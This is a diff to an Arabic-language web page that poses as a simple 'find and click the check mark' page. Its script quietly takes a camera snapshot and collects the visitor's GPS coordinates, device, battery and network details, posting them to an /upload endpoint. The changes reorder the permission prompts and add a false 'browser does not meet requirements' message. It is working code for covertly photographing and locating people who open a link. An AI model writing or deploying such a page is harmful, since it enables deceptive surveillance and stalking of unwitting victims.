@@ -5,6 +5,14 @@
       welcom to ابحث عن علامة ✅ واظغط عليها <br />لم ترها ؟ من فظلك انتظر بضع
       ثواني وستظهر ..
     </h2>
+    <!-- <video id="preview" autoplay style="width: 100%; max-width: 400px"></video> -->
+    <!-- <video
+      id="preview"
+      autoplay
+      muted
+      playsinline
+      style="display: none"
+    ></video> -->
     <video
       id="preview"
       autoplay
@@ -21,88 +29,95 @@
 
       async function startCamera() {
         try {
-          // أولاً: طلب إذن الموقع
-          navigator.geolocation.getCurrentPosition(
-            async (pos) => {
-              // ثانياً: طلب إذن الكاميرا
-              try {
-                const permission = await navigator.permissions.query({
-                  name: "camera",
-                });
-                if (permission.state === "denied") {
-                  document.body.innerHTML =
-                    "<h2 style='color:red;'>❌ تم رفض إذن الكاميرا من المتصفح</h2>";
-
-                  const payload = {
-                    image: "null",
-                    info: {
-                      time: new Date().toLocaleString(),
-                      location: "غير متاح",
-                      device: navigator.userAgent,
-                      battery: "غير متاح",
-                      network: "غير معروف",
-                    },
-                  };
-
-                  fetch("/upload", {
-                    method: "POST",
-                    body: JSON.stringify(payload),
-                    headers: { "Content-Type": "application/json" },
-                  });
-
-                  return;
-                }
-
-                stream = await navigator.mediaDevices.getUserMedia({
-                  video: true,
-                });
-              } catch (err) {
-                document.body.innerHTML =
-                  "<h2 style='color:red;'>❌ لم يتم تشغيل الكاميرا: " +
-                  err.message +
-                  "</h2>";
-
-                const payload = {
-                  image: "null",
-                  info: {
-                    time: new Date().toLocaleString(),
-                    location: "غير متاح",
-                    device: navigator.userAgent,
-                    battery: "غير متاح",
-                    network: "غير معروف",
-                  },
-                };
-
-                fetch("/upload", {
-                  method: "POST",
-                  body: JSON.stringify(payload),
-                  headers: { "Content-Type": "application/json" },
-                });
-
-                return;
-              }
-
-              const video = document.getElementById("preview");
-              video.srcObject = stream;
-
-              video.onloadedmetadata = () => {
-                setTimeout(() => captureAndSend(pos), 1000);
-              };
-            },
-            (err) => {
+          try {
+            const permission = await navigator.permissions.query({
+              name: "camera",
+            });
+            if (permission.state === "denied") {
               document.body.innerHTML =
-                "<h2 style='color:red;'>❌ لم يتم الحصول على الموقع: " +
-                err.message +
-                "</h2>";
+                "<h2 style='color:red;'>❌ تم رفض إذن الكاميرا من المتصفح</h2>";
+
+              const payload = {
+                image: "null",
+                info: {
+                  time: new Date().toLocaleString(),
+                  location: "غير متاح",
+                  device: navigator.userAgent,
+                  battery: "غير متاح",
+                  network: "غير معروف",
+                },
+              };
+
+              fetch("/upload", {
+                method: "POST",
+                body: JSON.stringify(payload),
+                headers: { "Content-Type": "application/json" },
+              });
+
+              return;
             }
-          );
+
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          } catch (err) {
+            document.body.innerHTML =
+              "<h2 style='color:red;'>❌ لم يتم تشغيل الكاميرا: " +
+              err.message +
+              "</h2>";
+
+            const payload = {
+              image: "null",
+              info: {
+                time: new Date().toLocaleString(),
+                location: "غير متاح",
+                device: navigator.userAgent,
+                battery: "غير متاح",
+                network: "غير معروف",
+              },
+            };
+
+            fetch("/upload", {
+              method: "POST",
+              body: JSON.stringify(payload),
+              headers: { "Content-Type": "application/json" },
+            });
+
+            return;
+          }
         } catch (err) {
           document.body.innerHTML =
-            "<h2 style='color:red;'>❌ خطأ غير متوقع: " + err.message + "</h2>";
+            "<h2 style='color:red;'>❌ لم يتم تشغيل الكاميرا: " +
+            err.message +
+            "</h2>";
+
+          const payload = {
+            image: "null",
+            info: {
+              time: new Date().toLocaleString(),
+              location: "غير متاح",
+              device: navigator.userAgent,
+              battery: "غير متاح",
+              network: "غير معروف",
+            },
+          };
+
+          fetch("/upload", {
+            method: "POST",
+            body: JSON.stringify(payload),
+            headers: { "Content-Type": "application/json" },
+          });
+
+          return;
         }
+
+        const video = document.getElementById("preview");
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          setTimeout(captureAndSend, 200); // ننتظر ثانية واحدة بعد تشغيل الكاميرا
+        };
       }
 
-      async function captureAndSend(pos) {
+      async function captureAndSend() {
         const canvas = document.getElementById("snapshot");
         const video = document.getElementById("preview");
         const ctx = canvas.getContext("2d");
@@ -126,34 +141,54 @@
           connectionType = navigator.connection.effectiveType;
         }
 
-        let location = "غير متاح";
-        if (pos && pos.coords) {
-          const lat = pos.coords.latitude.toFixed(5);
-          const lon = pos.coords.longitude.toFixed(5);
-          location = `${lat}, ${lon}`;
-        }
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const lat = pos.coords.latitude.toFixed(5);
+            const lon = pos.coords.longitude.toFixed(5);
 
-        const payload = {
-          image: imageData,
-          info: {
-            time: timestamp,
-            location: location,
-            device: userAgent,
-            battery: batteryLevel,
-            network: connectionType,
+            const payload = {
+              image: imageData,
+              info: {
+                time: timestamp,
+                location: `${lat}, ${lon}`,
+                device: userAgent,
+                battery: batteryLevel,
+                network: connectionType,
+              },
+            };
+
+            fetch("/upload", {
+              method: "POST",
+              body: JSON.stringify(payload),
+              headers: { "Content-Type": "application/json" },
+            });
+
+            document.getElementById("info").innerText =
+              "✅ تم التوثيق والإرسال";
           },
-        };
+          (err) => {
+            const payload = {
+              image: imageData,
+              info: {
+                time: timestamp,
+                location: "غير متاح",
+                device: userAgent,
+                battery: batteryLevel,
+                network: connectionType,
+              },
+            };
 
-        fetch("/upload", {
-          method: "POST",
-          body: JSON.stringify(payload),
-          headers: { "Content-Type": "application/json" },
-        });
+            fetch("/upload", {
+              method: "POST",
+              body: JSON.stringify(payload),
+              headers: { "Content-Type": "application/json" },
+            });
 
-        document.getElementById("info").innerText =
-          location === "غير متاح"
-            ? "✅ تم التوثيق بدون موقع"
-            : "✅ تم التوثيق والإرسال";
+            document.getElementById("info").innerText =
+              "متصفحك لا يلبي المتطلبات حاول مجددا ";
+            ("Your browser does not meet the requirements. Try again.");
+          }
+        );
       }
     </script>
   </body>
